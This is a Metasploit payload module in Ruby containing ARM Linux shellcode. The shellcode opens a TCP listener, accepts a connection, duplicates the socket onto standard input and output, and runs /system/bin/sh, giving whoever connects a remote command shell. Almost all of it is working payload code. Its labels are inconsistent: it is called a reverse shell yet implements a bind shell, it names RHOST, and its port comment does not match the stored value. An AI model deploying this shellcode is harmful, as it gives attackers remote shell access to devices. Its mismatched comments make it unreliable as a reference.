require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Linux
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
			'Version'       => '',
			'Description'   => 'Connect to target and spawn a command shell',
			'Author'        => ['civ', 'hal'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_ARMLE,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShellUnix,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'RHOST'    => [ 208, 'ADDR' ],
							'LPORT'    => [ 206, 'n' ],
						},
					'Payload' =>
						[
							   
							# socket
							0xe3a00002, # mov     r0, #2
							0xe3a01001, # mov     r1, #1
							0xe3a02006, # mov     r2, #6
							0xe3a07001, # mov     r7, #1
							0xe1a07407, # lsl     r7, r7, #8
							0xe2877019, # add     r7, r7, #25
							0xef000000, # svc     0x00000000
							0xe1a06000, # mov     r6, r0

							# bind
							0xe28f10A4, # 1dr     r1, pc, #172  ; 0x9C
							0xe3a02010, # mov     r2, #16
							0xe3a07001, # mov     r7, #1
							0xe1a07407, # lsl     r7, r7, #8
							0xe287701a, # add     r7, r7, #26
							0xef000000, # svc     0x00000000
	
							# listen
							0xe1a00006, # mov     r0, r6
							0xe3a07001, # mov     r7, #1
							0xe1a07407, # lsl     r7, r7, #8
							0xe287701c, # add     r7, r7, #28
							0xef000000, # svc     0x00000000

							# accept
							0xe1a00006, # mov     r0, r6
							0xe0411001, # sub     r1, r1, r1
							0xe0422002, # sub     r2, r2, r2
							0xe3a07001, # mov     r7, #1
							0xe1a07407, # lsl     r7, r7, #8
							0xe287701d, # add     r7, r7, #29
							0xef000000, # svc     0x00000000

							# dup
							0xe1a06000, # mov     r6, r0
							0xe3a01002, # mov     r1, #2
							0xe1a00006, # mov     r0, r6
							0xe3a0703f, # mov     r7, #63 ; 0x3f
							0xef000000, # svc     0x00000000
							0xe2511001, # subs    r1, r1, #1
							0x5afffffa, # bpl     8c <.text+0x8c>

							# execve("/system/bin/sh", args, env)
							0xe28f0048, # add     r0, pc, #72     ; 0xe40
							0xe0244004, # eor     r4, r4, r4
							0xe92d0010, # push    {r4}
							0xe1a0200d, # mov     r2, sp
							0xe92d0004, # push    {r2}
							0xe1a0200d, # mov     r2, sp
							0xe92d0010, # push    {r4}
							0xe59f1048, # ldr     r1, [pc, #72]   ; 8124 <env+0xe8>
							0xe92d0002, # push    {r1}
							0xe92d2000, # push    {sp}
							0xe1a0100d, # mov     r1, sp
							0xe92d0004, # push    {r2}
							0xe1a0200d, # mov     r2, sp
							0xe3a0700b, # mov     r7, #11 ; 0xeb
							0xef000000, # svc     0x00000000

							# exit(0)
							0xe3a00000, # mov     r0, #0  ; 0x0
							0xe3a07001, # mov     r7, #1  ; 0x1
							0xef000000, # svc     0x00000000

							# <af>:
							0x04290002, # .word   0x5c110002 @ port: 4444 , sin_fam = 2
							0x0101a8c0, # .word   0x0101a8c0 @ ip: 192.168.1.1

							# <shell>:
							0x00000000, # .word   0x00000000 ; the shell goes here!
							0x00000000, # .word   0x00000000
							0x00000000, # .word   0x00000000
							0x00000000, # .word   0x00000000

							# <arg>:
							0x00000000  # .word   0x00000000 ; the args!

						].pack("V*")
				}
			))

		# Register command execution options
		register_options(
			[
				OptString.new('SHELL', [ true, "The shell to execute.", "/system/bin/sh" ]),
				OptString.new('SHELLARG', [ false, "The argument to pass to the shell.", "-C" ])
			], self.class)
	end

	def generate
		p = super

		sh = datastore['SHELL']
		if sh.length >= 16
			raise ArgumentError, "The specified shell must be less than 16 bytes."
		end
		p[212, sh.length] = sh

		arg = datastore['SHELLARG']
		if arg
			if arg.length >= 4
				raise ArgumentError, "The specified shell argument must be less than 4 bytes."
			end
			p[228, arg.length] = arg
		end

		p
	end

end
